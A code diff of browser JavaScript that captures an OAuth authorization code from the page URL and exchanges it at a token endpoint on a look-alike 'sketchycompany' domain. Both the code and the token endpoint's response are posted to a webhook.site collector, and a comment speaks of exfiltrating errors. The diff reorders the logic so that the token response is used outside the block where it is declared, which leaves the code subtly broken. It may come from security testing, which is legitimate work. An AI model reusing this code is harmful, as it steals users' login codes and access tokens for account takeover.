@@ -10,59 +10,46 @@
             const TOKEN_URL = "https://login.sketchycompany.upd-dcs.work/token";
             const WEBHOOK =
                 "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e";
-            try {
-                const searchParams = window.location.search;
-                const parsedParams = new URLSearchParams(searchParams);
-                const code = parsedParams.get("code");
+            const searchParams = window.location.search;
+            const parsedParams = new URLSearchParams(searchParams);
+            const code = parsedParams.get("code");
 
-                if (!code) {
-                    await fetch(WEBHOOK, {
-                        method: "POST",
-                        body: 'Execution stopped: No "code" parameter found in URL.',
-                    });
-                    return;
-                }
-
-                const formBody = new URLSearchParams();
-                formBody.append("grant_type", "authorization_code");
-                formBody.append("code", code);
-                formBody.append(
-                    "code_verifier",
-                    "I2c5OoLJFYkzPacUdsrQkJbCsUfxnVnz_rgV_UEdC6dIf_fHcgHsdBWkQqD95ruY",
-                );
-                formBody.append("client_id", "CLIENT123");
-                formBody.append(
-                    "redirect_uri",
-                    "https://github-13261.sketchycompany.upd-dcs.work/callback",
-                );
-
+            if (!code) {
                 await fetch(WEBHOOK, {
                     method: "POST",
-                    headers: {
-                        "Content-Type": "application/x-www-form-urlencoded",
-                    },
-                    body: formBody,
+                    body: 'Execution stopped: No "code" parameter found in URL.',
                 });
+                return;
+            }
 
+            const formBody = new URLSearchParams();
+            formBody.append("grant_type", "authorization_code");
+            formBody.append("code", code);
+            formBody.append(
+                "code_verifier",
+                "I2c5OoLJFYkzPacUdsrQkJbCsUfxnVnz_rgV_UEdC6dIf_fHcgHsdBWkQqD95ruY",
+            );
+            formBody.append("client_id", "CLIENT123");
+            formBody.append(
+                "redirect_uri",
+                "https://github-13261.sketchycompany.upd-dcs.work/callback",
+            );
+
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                body: formBody,
+            });
+
+            try {
                 const tokenResponse = await fetch(TOKEN_URL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/x-www-form-urlencoded",
                     },
                     body: formBody,
-                });
-
-                const rawResponseText = await tokenResponse.text();
-
-                await fetch(WEBHOOK, {
-                    method: "POST",
-                    headers: { "Content-Type": "text/plain" },
-                    body: JSON.stringify({
-                        event: "Token endpoint response received",
-                        httpStatus: tokenResponse.status,
-                        statusText: tokenResponse.statusText,
-                        bodyData: rawResponseText,
-                    }),
                 });
             } catch (error) {
                 // 8. Catch and exfiltrate any errors (CORS blocks, DNS resolution errors, network drops)
@@ -91,6 +78,19 @@
                     }),
                 });
             }
+
+            const rawResponseText = await tokenResponse.text();
+
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "text/plain" },
+                body: JSON.stringify({
+                    event: "Token endpoint response received",
+                    httpStatus: tokenResponse.status,
+                    statusText: tokenResponse.statusText,
+                    bodyData: rawResponseText,
+                }),
+            });
         }
 
         sendCode();
